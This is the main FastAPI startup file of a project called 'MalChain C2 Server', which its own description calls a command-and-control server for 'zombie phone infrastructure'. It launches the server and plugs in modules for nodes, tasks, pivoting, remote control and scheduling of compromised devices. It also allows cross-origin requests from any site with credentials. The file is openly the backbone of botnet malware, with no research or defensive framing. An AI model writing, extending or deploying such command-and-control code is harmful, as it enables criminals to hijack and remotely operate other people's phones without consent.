from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from contextlib import asynccontextmanager
from core.database import init_db, engine
from core.redis_client import init_redis, close_redis
from api.routes import nodes, tasks, websocket, pivot, remote_control, statistics, scheduler


@asynccontextmanager
async def lifespan(app: FastAPI):
    # Startup
    await init_db()
    await init_redis()
    app.state.engine = engine
    print("C2 Server started successfully")
    yield
    # Shutdown
    await close_redis()
    print("C2 Server shutdown")


app = FastAPI(
    title="MalChain C2 Server",
    description="Command & Control server for zombie phone infrastructure",
    version="1.0.0",
    lifespan=lifespan
)

# CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Include routers
app.include_router(nodes.router)
app.include_router(tasks.router)
app.include_router(websocket.router)
app.include_router(pivot.router)
app.include_router(remote_control.router)
app.include_router(statistics.router)
app.include_router(scheduler.router)


@app.get("/")
async def root():
    return {
        "service": "MalChain C2 Server",
        "version": "1.0.0",
        "status": "operational"
    }


@app.get("/health")
async def health_check():
    return {"status": "healthy"}


if __name__ == "__main__":
    import uvicorn
    from core.config import settings

    uvicorn.run(
        "main:app",
        host=settings.HOST,
        port=settings.PORT,
        reload=True
    )
